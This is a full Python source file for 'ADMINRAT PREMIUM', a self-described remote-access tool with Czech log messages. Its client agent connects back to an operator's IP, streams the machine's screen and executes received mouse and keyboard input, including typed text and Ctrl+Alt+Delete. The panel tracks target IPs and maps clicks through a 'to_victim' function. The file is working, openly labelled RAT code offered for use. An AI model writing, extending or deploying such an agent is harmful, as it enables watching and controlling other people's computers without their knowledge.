#!/usr/bin/env python3
# ADMINRAT PREMIUM
#   python adminrat.py            -> panel + lokalni rezim
#   python adminrat.py client IP  -> agent pro druhy stroj
#   python adminrat.py test       -> diagnostika
import ctypes
import io
import json
import os
import queue
import socket
import struct
import sys
import threading
import time
import traceback

PORT = 5555
HERE = os.path.dirname(os.path.abspath(__file__))
IPS_FILE = os.path.join(HERE, "ips.txt")

BG = "#05080a"
PANEL = "#0b1114"
GREEN = "#00ff41"
DIM = "#1f6f33"
TEXT = "#c8ffd4"
MUTED = "#4b7a5a"
RED = "#ff3b3b"
AMBER = "#ffb000"

if os.name == "nt":
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass

_lf = None
_lk = threading.Lock()

def open_log(name):
    global _lf
    try:
        _lf = open(os.path.join(HERE, name), "a", encoding="utf-8")
    except Exception:
        _lf = None

def log(msg):
    line = f"{time.strftime('%H:%M:%S')} {msg}"
    print(line, flush=True)
    with _lk:
        if _lf:
            try:
                _lf.write(line + "\n")
                _lf.flush()
            except Exception:
                pass

def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            raise ConnectionError("spojeni ukonceno")
        buf += c
    return bytes(buf)

def recv_msg(sock):
    (n,) = struct.unpack(">I", recv_exact(sock, 4))
    return recv_exact(sock, n) if n else b""

def send_msg(sock, data, lock=None):
    p = struct.pack(">I", len(data)) + data
    if lock:
        with lock:
            sock.sendall(p)
    else:
        sock.sendall(p)

if os.name == "nt":
    from ctypes import wintypes

    ULONG_PTR = ctypes.c_ulonglong if ctypes.sizeof(ctypes.c_void_p) == 8 else ctypes.c_ulong
    user32 = ctypes.windll.user32

    class MOUSEINPUT(ctypes.Structure):
        _fields_ = [("dx", wintypes.LONG), ("dy", wintypes.LONG), ("mouseData", wintypes.DWORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD), ("dwExtraInfo", ULONG_PTR)]

    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD), ("dwFlags", wintypes.DWORD),
                    ("time", wintypes.DWORD), ("dwExtraInfo", ULONG_PTR)]

    class HARDWAREINPUT(ctypes.Structure):
        _fields_ = [("uMsg", wintypes.DWORD), ("wParamL", wintypes.WORD), ("wParamH", wintypes.WORD)]

    class INPUT_UNION(ctypes.Union):
        _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]

    class INPUT(ctypes.Structure):
        _fields_ = [("type", wintypes.DWORD), ("u", INPUT_UNION)]

    INPUT_KEYBOARD = 1
    KU = 0x0002
    UNICODE = 0x0004
    VK = {"enter": 0x0D, "backspace": 0x08, "tab": 0x09, "esc": 0x1B, "space": 0x20,
          "delete": 0x2E, "ctrl": 0x11, "alt": 0x12, "shift": 0x10, "cmd": 0x5B, "f5": 0x74}

    def _ki(vk, scan, flags):
        return INPUT(type=INPUT_KEYBOARD, u=INPUT_UNION(ki=KEYBDINPUT(vk, scan, flags, 0, 0)))

    def _send(inputs):
        arr = (INPUT * len(inputs))(*inputs)
        user32.SendInput(len(inputs), arr, ctypes.sizeof(INPUT))

    class WinInput:
        name = "SendInput"

        def send(self, p):
            t = p["type"]
            if t == "move":
                user32.SetCursorPos(int(p["x"]), int(p["y"]))
            elif t == "click":
                user32.SetCursorPos(int(p["x"]), int(p["y"]))
                self._btn(p.get("button", "left"), p["down"])
            elif t == "double":
                user32.SetCursorPos(int(p["x"]), int(p["y"]))
                self._btn("left", True)
                self._btn("left", False)
                self._btn("left", True)
                self._btn("left", False)
            elif t == "scroll":
                user32.mouse_event(0x0800, 0, 0, 120 * int(p["dy"]), 0)
            elif t == "type":
                self._text(p["text"])
            elif t == "key":
                vk = VK.get(p["key"])
                if vk:
                    user32.keybd_event(vk, 0, 0, 0)
                    user32.keybd_event(vk, 0, KU, 0)
            elif t == "hotkey":
                vks = [VK[k] for k in p["keys"] if k in VK]
                for vk in vks:
                    user32.keybd_event(vk, 0, 0, 0)
                for vk in reversed(vks):
                    user32.keybd_event(vk, 0, KU, 0)

        def _btn(self, b, down):
            flags = {"left": (0x0002, 0x0004), "right": (0x0008, 0x0010),
                     "middle": (0x0020, 0x0040)}.get(b, (0x0002, 0x0004))
            user32.mouse_event(flags[0] if down else flags[1], 0, 0, 0, 0)

        def _text(self, text):
            inputs = []
            for ch in text:
                raw = ch.encode("utf-16-le")
                for i in range(0, len(raw), 2):
                    unit = int.from_bytes(raw[i:i + 2], "little")
                    inputs.append(_ki(0, unit, UNICODE))
                    inputs.append(_ki(0, unit, UNICODE | KU))
            _send(inputs)

class PynputInput:
    name = "pynput"

    def __init__(self):
        from pynput.mouse import Controller as Mouse, Button
        from pynput.keyboard import Controller as Keyboard, Key
        self.m = Mouse()
        self.k = Keyboard()
        self.B = {"left": Button.left, "right": Button.right, "middle": Button.middle}
        self.K = {"enter": Key.enter, "backspace": Key.backspace, "tab": Key.tab, "esc": Key.esc,
                  "space": Key.space, "delete": Key.delete, "ctrl": Key.ctrl, "alt": Key.alt,
                  "shift": Key.shift, "cmd": Key.cmd, "f5": Key.f5}

    def send(self, p):
        t = p["type"]
        if t == "move":
            self.m.position = (p["x"], p["y"])
        elif t == "click":
            self.m.position = (p["x"], p["y"])
            b = self.B.get(p.get("button", "left"))
            self.m.press(b) if p["down"] else self.m.release(b)
        elif t == "double":
            self.m.position = (p["x"], p["y"])
            self.m.click(self.B["left"], 2)
        elif t == "scroll":
            self.m.scroll(0, p["dy"])
        elif t == "type":
            self.k.type(p["text"])
        elif t == "key":
            k = self.K.get(p["key"])
            if k:
                self.k.press(k)
                self.k.release(k)
        elif t == "hotkey":
            ks = [self.K[k] for k in p["keys"] if k in self.K]
            for k in ks:
                self.k.press(k)
            for k in reversed(ks):
                self.k.release(k)

def make_input():
    if os.name == "nt":
        try:
            return WinInput()
        except Exception as e:
            log(f"SendInput selhal: {e}")
    try:
        return PynputInput()
    except Exception as e:
        log(f"pynput selhal: {e}")
        return None

def make_grabber():
    from PIL import ImageGrab
    return ImageGrab.grab

def run_panel():
    import tkinter as tk
    from tkinter import ttk
    from PIL import Image, ImageTk

    class Panel:
        def __init__(self, root):
            self.root = root
            self.mode = None
            self.alive = False
            self.conn = self.srv = None
            self.lock = threading.Lock()
            self.q = queue.Queue(3)
            self.scale = 1.0
            self.off = (0, 0)
            self.vsize = (1920, 1080)
            self.last_frame = None
            self.pending_move = None
            self.move_lock = threading.Lock()
            self.frames = 0
            self.fps = 0.0
            self.fps_t = time.time()
            self.input = None
            self.input_q = queue.Queue()
            self.current_ip = ""

            root.title("ADMINRAT PREMIUM")
            sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
            root.geometry(f"{min(sw - 40, 1280)}x{min(sh - 60, 900)}")
            root.minsize(900, 600)
            root.configure(bg=BG)

            st = ttk.Style()
            try:
                st.theme_use("clam")
            except Exception:
                pass
            st.configure("h.Horizontal.TProgressbar", troughcolor=PANEL, background=GREEN,
                         bordercolor=PANEL, lightcolor=GREEN, darkcolor=GREEN)
            st.configure("TCombobox", fieldbackground=PANEL, background=PANEL,
                         foreground=GREEN, arrowcolor=GREEN, bordercolor=DIM)
            root.option_add("*TCombobox*Listbox.background", PANEL)
            root.option_add("*TCombobox*Listbox.foreground", GREEN)
            root.option_add("*TCombobox*Listbox.selectBackground", GREEN)
            root.option_add("*TCombobox*Listbox.selectForeground", BG)

            head = tk.Frame(root, bg=PANEL, height=38)
            head.pack(fill="x")
            head.pack_propagate(False)
            tk.Label(head, text="▮", bg=PANEL, fg=GREEN,
                     font=("Consolas", 15, "bold")).pack(side="left", padx=(10, 4))
            tk.Label(head, text="ADMINRAT", bg=PANEL, fg=GREEN,
                     font=("Consolas", 14, "bold")).pack(side="left")
            tk.Label(head, text="PREMIUM", bg=GREEN, fg=BG,
                     font=("Consolas", 8, "bold")).pack(side="left", padx=6)
            self.pill = tk.Label(head, text="[ idle ]", bg=PANEL, fg=MUTED,
                                 font=("Consolas", 9))
            self.pill.pack(side="left", padx=12)

            def btn(parent, text, cmd, fg=GREEN):
                b = tk.Button(parent, text=text, command=cmd, bg=PANEL, fg=fg,
                              activebackground=fg, activeforeground=BG,
                              relief="flat", bd=0, padx=10, pady=4,
                              font=("Consolas", 9, "bold"), cursor="hand2",
                              highlightthickness=1, highlightbackground=DIM)
                b.bind("<Enter>", lambda e: b.config(bg="#12201a"))
                b.bind("<Leave>", lambda e: b.config(bg=PANEL))
                return b

            btn(head, "EXIT", self.on_close, RED).pack(side="right", padx=(0, 10))
            btn(head, "FULL", self.fullscreen).pack(side="right", padx=3)
            btn(head, "SAVE", self.save).pack(side="right", padx=3)
            btn(head, "STOP", self.stop).pack(side="right", padx=3)
            btn(head, "WAIT", self.start_server).pack(side="right", padx=3)
            btn(head, "LOCAL", self.start_local).pack(side="right", padx=3)

            net = tk.Frame(root, bg=BG)
            net.pack(fill="x", padx=10, pady=4)
            tk.Label(net, text="target ip >", bg=BG, fg=DIM,
                     font=("Consolas", 9)).pack(side="left")
            self.ip = ttk.Combobox(net, width=20, font=("Consolas", 10),
                                   values=self.load_ips())
            self.ip.pack(side="left", padx=6)
            if self.ip["values"]:
                self.ip.set(self.ip["values"][0])
            self.ip.bind("<Return>", lambda e: self.connect_ip())
            btn(net, "CONNECT", self.connect_ip).pack(side="left")
            btn(net, "RECONNECT", self.reconnect, AMBER).pack(side="left", padx=4)

            self.with_enter = tk.BooleanVar(value=False)
            tk.Checkbutton(net, text="enter po textu", variable=self.with_enter,
                           bg=BG, fg=MUTED, selectcolor=PANEL, activebackground=BG,
                           activeforeground=GREEN, font=("Consolas", 8),
                           highlightthickness=0).pack(side="left", padx=10)

            self.banner = tk.Label(root, text="", bg=RED, fg="#000000",
                                   font=("Consolas", 9, "bold"), anchor="w")
            self.banner.pack(fill="x", padx=10)

            self.canvas = tk.Canvas(root, bg="#000000", highlightthickness=0, height=300)
            self.canvas.pack(fill="both", expand=True, padx=10, pady=6)
            self.canvas.bind("<Motion>", self.on_move)
            self.canvas.bind("<Button-1>", lambda e: self.on_click(e, "left", True))
            self.canvas.bind("<ButtonRelease-1>", lambda e: self.on_click(e, "left", False))
            self.canvas.bind("<Button-3>", lambda e: self.on_click(e, "right", True))
            self.canvas.bind("<ButtonRelease-3>", lambda e: self.on_click(e, "right", False))
            self.canvas.bind("<Double-Button-1>", self.on_double)
            self.canvas.bind("<MouseWheel>", self.on_wheel)
            self.canvas.create_text(360, 120, text="no signal", fill=DIM,
                                    font=("Consolas", 18, "bold"))

            msgbar = tk.Frame(root, bg=BG)
            msgbar.pack(fill="x", padx=10)
            tk.Label(msgbar, text="messages", bg=BG, fg=DIM,
                     font=("Consolas", 8, "bold")).pack(side="left")
            btn(msgbar, "CLEAR", self.clear_chat).pack(side="right")

            self.chat = tk.Text(root, height=6, bg="#030605", fg=TEXT, relief="flat",
                                font=("Consolas", 9), state="disabled", wrap="word")
            self.chat.pack(fill="x", padx=10, pady=(2, 4))
            self.chat.tag_config("me", foreground=GREEN)
            self.chat.tag_config("sys", foreground=DIM)

            bottom = tk.Frame(root, bg=BG)
            bottom.pack(fill="x", padx=10)
            self.entry = tk.Entry(bottom, bg=PANEL, fg=GREEN, insertbackground=GREEN,
                                  relief="flat", font=("Consolas", 11))
            self.entry.pack(side="left", fill="x", expand=True, ipady=4)
            self.entry.bind("<Return>", lambda e: self.send_text())
            btn(bottom, "SEND", self.send_text).pack(side="left", padx=6)

            keys = tk.Frame(root, bg=BG)
            keys.pack(fill="x", padx=10)
            for label, key in [("ENTER", "enter"), ("BKSP", "backspace"), ("TAB", "tab"),
                               ("ESC", "esc"), ("SPACE", "space"), ("DEL", "delete"),
                               ("CTRL", "ctrl"), ("ALT", "alt"), ("SHIFT", "shift"), ("F5", "f5")]:
                btn(keys, label, lambda k=key: self.send({"type": "key", "key": k})).pack(side="left", padx=2, pady=4)
            btn(keys, "C+A+D", lambda: self.send({"type": "hotkey", "keys": ["ctrl", "alt", "delete"]})).pack(side="left", padx=6)

            self.logbox = tk.Text(root, height=3, bg="#030605", fg=DIM, relief="flat",
                                  font=("Consolas", 8), state="disabled")
            self.logbox.pack(fill="x", padx=10, pady=(2, 8))

            self.root.bind("<F11>", lambda e: self.fullscreen())
            root.protocol("WM_DELETE_WINDOW", self.on_close)

            threading.Thread(target=self.input_worker, daemon=True).start()
            root.after(150, self.boot)

        # ---------- boot ----------
        def boot(self):
            self.splash = tk.Frame(self.root, bg=BG)
            self.splash.place(relx=0, rely=0, relwidth=1, relheight=1)
            box = tk.Frame(self.splash, bg=BG)
            box.place(relx=0.5, rely=0.42, anchor="center")
            tk.Label(box, text="ADMINRAT", bg=BG, fg=GREEN,
                     font=("Consolas", 30, "bold")).pack()
            tk.Label(box, text="PREMIUM  v1.1", bg=BG, fg=DIM,
                     font=("Consolas", 10)).pack(pady=(0, 18))
            self.boot_lines = tk.Label(box, text="", bg=BG, fg=MUTED,
                                       font=("Consolas", 9), justify="left")
            self.boot_lines.pack(pady=(0, 12))
            self.pbar = ttk.Progressbar(box, length=340, mode="determinate",
                                        maximum=100, style="h.Horizontal.TProgressbar")
            self.pbar.pack()
            self.boot_text = []
            self.root.after(120, lambda: self.boot_step(0))

        def boot_step(self, i):
            if not hasattr(self, "splash") or not self.splash.winfo_exists():
                return
            seq = ["[ ok ] kernel hook", "[ ok ] capture driver", "[ ok ] input backend",
                   "[ ok ] socket layer", "[ ok ] ip history", "[ .. ] launching"]
            if i < len(seq):
                self.boot_text.append(seq[i])
                self.boot_lines.config(text="\n".join(self.boot_text))
            self.pbar["value"] = min(100, int((i + 1) / len(seq) * 100))
            if i < len(seq):
                self.root.after(180, lambda: self.boot_step(i + 1))
            else:
                self.boot_lines.config(text="\n".join(self.boot_text) + "\n\nACCESS GRANTED",
                                       fg=GREEN)
                self.root.after(400, self.end_boot)

        def end_boot(self):
            try:
                self.splash.destroy()
            except Exception:
                pass
            self.start_local()

        # ---------- ui ----------
        def ui_log(self, t):
            def u():
                self.logbox.config(state="normal")
                self.logbox.insert("end", f"{time.strftime('%H:%M:%S')} {t}\n")
                self.logbox.see("end")
                self.logbox.config(state="disabled")
            self.root.after(0, u)

        def chat_add(self, text, tag="me"):
            def u():
                self.chat.config(state="normal")
                self.chat.insert("end", f"{time.strftime('%H:%M:%S')} ", "sys")
                self.chat.insert("end", text + "\n", tag)
                self.chat.see("end")
                self.chat.config(state="disabled")
            self.root.after(0, u)

        def clear_chat(self):
            self.chat.config(state="normal")
            self.chat.delete("1.0", "end")
            self.chat.config(state="disabled")

        def pill_set(self, t, c):
            self.root.after(0, lambda: self.pill.config(text=f"[ {t} ]", fg=c))

        def fail(self, e):
            log(f"CHYBA: {e}")
            self.ui_log(f"[!] {e}")
            self.root.after(0, lambda: self.banner.config(text=f"  [!] {e}"))
            self.pill_set("error", RED)

        def clear_banner(self):
            self.root.after(0, lambda: self.banner.config(text=""))

        def fullscreen(self):
            self.root.attributes("-fullscreen", not self.root.attributes("-fullscreen"))

        # ---------- historie IP ----------
        def load_ips(self):
            try:
                with open(IPS_FILE) as f:
                    return [l.strip() for l in f if l.strip()][:15]
            except Exception:
                return []

        def add_ip(self, ip):
            ips = [i for i in self.load_ips() if i != ip]
            ips.insert(0, ip)
            try:
                with open(IPS_FILE, "w") as f:
                    f.write("\n".join(ips[:15]))
            except Exception:
                pass
            self.root.after(0, lambda: self.ip.config(values=ips[:15]))

        # ---------- rezimy ----------
        def stop(self):
            self.alive = False
            for s in (self.conn, self.srv):
                try:
                    if s:
                        s.close()
                except Exception:
                    pass
            self.conn = self.srv = None
            self.mode = None
            self.pill_set("stopped", MUTED)
            self.ui_log("[-] stream stopped")

        def start_local(self):
            threading.Thread(target=self._start_local, daemon=True).start()

        def _start_local(self):
            try:
                self.stop()
                self.clear_banner()
                if self.input is None:
                    self.input = make_input()
                if self.input is None:
                    self.fail("vstup nedostupny - jen prohlizeni")
                else:
                    self.ui_log(f"[+] input: {self.input.name}")
                grab = make_grabber()
                self.vsize = grab().size
                self.mode = "local"
                self.alive = True
                self.ui_log(f"[+] local {self.vsize[0]}x{self.vsize[1]}")
                self.pill_set("local", GREEN)
                threading.Thread(target=self.local_capture, args=(grab,), daemon=True).start()
            except Exception as e:
                self.fail(e)

        def local_capture(self, grab):
            while self.alive:
                t0 = time.time()
                try:
                    img = grab()
                    if img.width > 1400:
                        img = img.resize((1400, int(img.height * 1400 / img.width)), Image.BILINEAR)
                    buf = io.BytesIO()
                    img.save(buf, "JPEG", quality=55)
                    self.on_frame(buf.getvalue())
                except Exception as e:
                    self.fail(e)
                    self.alive = False
                    return
                time.sleep(max(0, 1 / 12 - (time.time() - t0)))

        def start_server(self):
            threading.Thread(target=self._start_server, daemon=True).start()

        def _start_server(self):
            try:
                self.stop()
                self.clear_banner()
                srv = socket.socket()
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", PORT))
                srv.listen(1)
                self.srv = srv
                self.mode = "server"
                self.pill_set(f"wait :{PORT}", AMBER)
                self.ui_log(f"[*] listening :{PORT}")
                conn, addr = srv.accept()
                self.conn = conn
                self.alive = True
                self.ui_log(f"[+] client {addr[0]}")
                self.chat_add(f"system: klient pripojen z {addr[0]}", "sys")
                self.pill_set(f"link {addr[0]}", GREEN)
                threading.Thread(target=self.net_receiver, daemon=True).start()
            except Exception as e:
                if self.mode == "server":
                    self.fail(e)

        def connect_ip(self):
            host = self.ip.get().strip()
            if host:
                threading.Thread(target=self._connect, args=(host,), daemon=True).start()

        def reconnect(self):
            if self.current_ip:
                threading.Thread(target=self._connect, args=(self.current_ip,), daemon=True).start()

        def _connect(self, host):
            try:
                self.stop()
                self.clear_banner()
                self.pill_set("connecting", AMBER)
                c = socket.create_connection((host, PORT), timeout=10)
                c.settimeout(None)
                self.conn = c
                self.mode = "client"
                self.alive = True
                self.current_ip = host
                self.add_ip(host)
                self.ui_log(f"[+] connected {host}")
                self.chat_add(f"system: pripojeno na {host}", "sys")
                self.pill_set(f"link {host}", GREEN)
                threading.Thread(target=self.net_receiver, daemon=True).start()
            except Exception as e:
                self.fail(e)

        def net_receiver(self):
            try:
                while self.alive:
                    meta = json.loads(recv_msg(self.conn).decode())
                    if meta.get("type") == "hello":
                        self.vsize = (int(meta["w"]), int(meta["h"]))
                        self.ui_log(f"[*] resolution {self.vsize[0]}x{self.vsize[1]}")
                        continue
                    if meta.get("type") != "frame":
                        continue
                    self.on_frame(recv_msg(self.conn))
            except Exception as e:
                if self.alive:
                    self.ui_log(f"[-] link lost: {e}")
                self.alive = False
                self.pill_set("offline", RED)

        # ---------- obraz ----------
        def on_frame(self, data):
            self.last_frame = data
            self.frames += 1
            try:
                self.q.put_nowait(data)
            except queue.Full:
                try:
                    self.q.get_nowait()
                    self.q.put_nowait(data)
                except queue.Empty:
                    pass

        def tick(self):
            if time.time() - self.fps_t >= 1.0:
                self.fps = self.frames / (time.time() - self.fps_t)
                self.frames = 0
                self.fps_t = time.time()
            try:
                data = self.q.get_nowait()
            except queue.Empty:
                data = None
            if data:
                try:
                    img = Image.open(io.BytesIO(data))
                    cw = max(self.canvas.winfo_width(), 2)
                    ch = max(self.canvas.winfo_height(), 2)
                    r = min(cw / img.width, ch / img.height)
                    nw, nh = max(int(img.width * r), 1), max(int(img.height * r), 1)
                    self.scale, self.off = r, ((cw - nw) // 2, (ch - nh) // 2)
                    photo = ImageTk.PhotoImage(img.resize((nw, nh), Image.BILINEAR))
                    self.canvas.delete("all")
                    self.canvas.create_image(self.off[0], self.off[1], anchor="nw", image=photo)
                    self.canvas.create_text(10, 10, anchor="nw", fill=GREEN,
                                            font=("Consolas", 9, "bold"),
                                            text=f"{self.fps:.0f} FPS  {self.vsize[0]}x{self.vsize[1]}")
                    self.canvas.image = photo
                except Exception as e:
                    self.fail(e)
            self.root.after(30, self.tick)

        def save(self):
            if self.last_frame:
                n = os.path.join(HERE, f"adminrat_{int(time.time())}.jpg")
                with open(n, "wb") as f:
                    f.write(self.last_frame)
                self.ui_log(f"[+] saved {os.path.basename(n)}")

        # ---------- vstup ----------
        def input_worker(self):
            while True:
                try:
                    p = self.input_q.get(timeout=0.05)
                except queue.Empty:
                    p = None
                if p and self.input:
                    try:
                        self.input.send(p)
                    except Exception as e:
                        self.fail(e)
                with self.move_lock:
                    mv = self.pending_move
                    self.pending_move = None
                if mv and self.input:
                    try:
                        self.input.send({"type": "move", "x": mv[0], "y": mv[1]})
                    except Exception:
                        pass

        def to_victim(self, e):
            vx = int((e.x - self.off[0]) / self.scale)
            vy = int((e.y - self.off[1]) / self.scale)
            return max(0, min(vx, self.vsize[0] - 1)), max(0, min(vy, self.vsize[1] - 1))

        def send(self, p):
            if self.mode == "local":
                if self.input:
                    self.input_q.put(p)
            elif self.conn and self.alive:
                try:
                    send_msg(self.conn, json.dumps(p).encode(), self.lock)
                except Exception as e:
                    self.fail(e)

        def on_move(self, e):
            x, y = self.to_victim(e)
            if self.mode == "local":
                with self.move_lock:
                    self.pending_move = (x, y)
            else:
                self.send({"type": "move", "x": x, "y": y})

        def on_click(self, e, b, down):
            self.canvas.focus_set()
            x, y = self.to_victim(e)
            self.send({"type": "click", "x": x, "y": y, "button": b, "down": down})

        def on_double(self, e):
            x, y = self.to_victim(e)
            self.send({"type": "double", "x": x, "y": y})

        def on_wheel(self, e):
            self.send({"type": "scroll", "dy": 1 if e.delta > 0 else -1})

        def send_text(self):
            t = self.entry.get()
            if not t:
                return
            self.send({"type": "type", "text": t})
            if self.with_enter.get():
                self.send({"type": "key", "key": "enter"})
            self.chat_add(f"you ▸ {t}")
            self.ui_log(f"[>] {t}")
            self.entry.delete(0, "end")
            self.canvas.focus_set()

        def on_close(self):
            self.alive = False
            self.root.destroy()

    root = tk.Tk()
    p = Panel(root)
    root.after(30, p.tick)
    root.mainloop()

def run_client(host, port=PORT):
    grab = make_grabber()
    inp = make_input()
    lock = threading.Lock()

    def capture(sock, stop, size):
        while not stop.is_set():
            t0 = time.time()
            try:
                img = grab()
                if img.width > 1400:
                    from PIL import Image
                    img = img.resize((1400, int(img.height * 1400 / img.width)), Image.BILINEAR)
                buf = io.BytesIO()
                img.save(buf, "JPEG", quality=55)
                send_msg(sock, json.dumps({"type": "frame", "w": size[0], "h": size[1]}).encode(), lock)
                send_msg(sock, buf.getvalue(), lock)
            except Exception as e:
                log(f"capture chyba: {e}")
                stop.set()
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                return
            time.sleep(max(0, 1 / 12 - (time.time() - t0)))

    d = 2
    while True:
        try:
            log(f"pripojuji {host}:{port}")
            s = socket.create_connection((host, port), timeout=10)
            s.settimeout(None)
            size = grab().size
            log(f"pripojeno {size[0]}x{size[1]}")
            send_msg(s, json.dumps({"type": "hello", "w": size[0], "h": size[1]}).encode(), lock)
            stop = threading.Event()
            threading.Thread(target=capture, args=(s, stop, size), daemon=True).start()
            d = 2
            while not stop.is_set():
                p = json.loads(recv_msg(s).decode())
                if inp:
                    try:
                        inp.send(p)
                    except Exception as e:
                        log(f"vstup chyba: {e}")
        except Exception as e:
            log(f"spadlo: {e}, zkousim za {d}s")
            time.sleep(d)
            d = min(d * 2, 30)

def run_test():
    for m in ("PIL", "PIL.ImageGrab", "tkinter"):
        try:
            __import__(m)
            log(f"{m}: OK")
        except Exception as e:
            log(f"{m}: CHYBA -> {e}")
    try:
        from PIL import ImageGrab
        log(f"snimek: OK {ImageGrab.grab().size}")
    except Exception as e:
        log(f"snimek: CHYBA -> {e}")
    try:
        pt = ctypes.wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(pt))
        log(f"SendInput: OK, pozice {pt.x},{pt.y}")
    except Exception as e:
        log(f"SendInput: CHYBA -> {e}")
    try:
        s = socket.socket(); s.bind(("0.0.0.0", PORT)); s.close()
        log(f"port {PORT}: volny")
    except Exception as e:
        log(f"port {PORT}: obsazeny -> {e}")

if __name__ == "__main__":
    try:
        open_log("adminrat_log.txt")
        if len(sys.argv) > 1 and sys.argv[1] == "client":
            run_client(sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1")
        elif len(sys.argv) > 1 and sys.argv[1] == "test":
            run_test()
        else:
            run_panel()
    except KeyboardInterrupt:
        pass
    except Exception:
        log("NEOBSLOUZENA CHYBA:\n" + traceback.format_exc())
        input("Enter...")